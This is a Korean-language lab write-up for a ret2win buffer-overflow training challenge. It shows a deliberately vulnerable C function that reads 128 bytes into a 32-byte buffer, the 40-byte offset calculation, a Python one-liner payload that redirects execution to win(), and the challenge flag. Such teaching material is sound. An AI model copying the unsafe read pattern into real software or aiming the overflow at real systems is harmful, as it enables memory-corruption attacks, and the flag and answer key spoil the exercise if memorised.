# [BOF Track] Level 2: 기본 (Basic) - `bof_ret2win`

## 1. 문제 개요
스택 버퍼 오버플로우를 통해 **함수의 리턴 어드레스(Return Address, RET)**를 덮어써서 실행되지 않는 `win()` 함수로 제어 흐름을 가로채는(Control Flow Hijacking) 표준 ret2win 문제입니다.

---

## 2. 취약점 분석
```c
void vulnerable_function() {
    char buffer[32];
    read(0, buffer, 128); // 32바이트 버퍼에 128바이트 입력 허용
}
```
- `buffer`(32바이트) + `Saved RBP`(8바이트) = **총 40바이트 오프셋**.
- 40바이트 패딩 뒤에 `win()` 함수의 64비트 주소(`p64(win_addr)`)를 배치하면, `vulnerable_function`이 리턴하는 순간 `win()` 함수가 호출되어 플래그가 출력됩니다.

---

## 3. 공략법 (직접 수행)
```bash
make
./bof_ret2win        # 실행 시 출력되는 win() 주소를 확인
# 또는:  objdump -d ./bof_ret2win | grep '<win>:'
```
확인한 `win()` 주소로 페이로드를 구성해 전달합니다 (win 주소는 빌드마다 다를 수 있으니 하드코딩 금지):
```bash
python3 -c "import sys,struct; win=0x4011b6; \
sys.stdout.buffer.write(b'A'*40 + struct.pack('<Q', win))" | ./bof_ret2win
```
> `win` 값을 방금 확인한 본인 빌드의 주소로 바꾸세요.

---

## 4. 플래그
`FLAG{bof_basic_practice}`
